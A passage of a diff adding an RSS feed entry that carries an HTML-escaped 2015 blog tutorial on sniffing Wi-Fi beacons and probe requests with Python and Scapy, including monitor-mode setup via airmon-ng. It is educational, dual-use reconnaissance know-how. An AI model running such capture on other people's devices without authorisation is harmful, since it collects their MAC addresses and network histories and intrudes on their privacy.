+            &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PROBING&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;yellow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;for SSID:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;green&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Awesome. Now that we have our functions that will print our output depending on what wireless traffic is captured, we need to define one more function that will really be doing all of the work.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;PacketAnalyzer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;# Check to make sure we got an 802.11 packet&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;haslayer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dot11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+
+        &lt;span class=&quot;c&quot;&gt;# Check to see if it&#39;s an access point beacon&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subtype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;c&quot;&gt;# Check to see if we have seen the MAC address before, if not, continue with printing&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mac_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;mac_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;AccessPointPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+        &lt;span class=&quot;c&quot;&gt;# Check to see if it&#39;s a device probing for networks&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;haslayer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dot11ProbeReq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;c&quot;&gt;# Check to see if we have seen the MAC address before, if not, continue with printing&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mac_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;mac_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;c&quot;&gt;# Make sure SSID is not blank&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;ProbePrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We’re almost done now! Just one more line to add. This line uses Scapy’s sniff function which takes in the interface to listen on (the variable we set at the beginning of the script), our PacketAnalyzer function (prn tells Scapy to send the packet to our function), and a store value of 0 which insures the packets aren’t stored in memory so as to not hog resources.&lt;/p&gt;
+
+&lt;p&gt;Using this, once the script is executed, it will run continuosly, sniff wireless packets, and add the MAC address to the list so as to not repeatedly print the same device.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PacketAnalyzer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;running&quot;&gt;Running&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;You’re done! Now it’s time to see your creation.&lt;/p&gt;
+
+&lt;p&gt;There are two options to running this script, with or without the -V or –verbose option. But first, we have to get the wireless nic into a “listening” state to intercept packets and also edit the interface variable if your listening nic is different then what we added by default.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Find your wireless nic with.
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iwconfig #eg: wlan1&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use airmon to set your wireless nic to listen
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo airmon-ng start wlan1 #or w/e wireless nic you saw in step 1&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use iwconfig again to see what nic airmon created for you.
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iwconfig #eg: mon1&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;If different then what’s in the “interface” variable,
+change the string to your interface.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Now run your script and see the results!&lt;/p&gt;
+
+&lt;h3 id=&quot;what-now&quot;&gt;What now?&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;It’s up to you! Here are some challenges if you are up for it.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Try condensing the functions to 1 or 2 and use “if” statements inside of them to determine what to do.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Instead of having to manually edit the script with your listening wireless nic, try to add another script argument (maybe -i, –interface) that is given a value at runtime. This will allow you to specify an interface as a script argument, like –verbose.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;I don’t believe Scapy channel hopes, so try creating an alternate script to rotate through wireles channels. Maybe a cron job?&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Maybe you only want to store the MAC addresses of the access points and want to print all other traffic, even if it’s potentially duplicates. You can make it happen!&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        <pubDate>Tue, 21 Apr 2015 10:39:55 -0400</pubDate>
+        <link>http://localhost//2015/Python-Wireless-Sniffing-With-Scapy/</link>
+        <guid isPermaLink="true">http://localhost//2015/Python-Wireless-Sniffing-With-Scapy/</guid>
+        
+        <category>python</category>
+        
+        <category>scapy</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+  </channel>
+</rss>
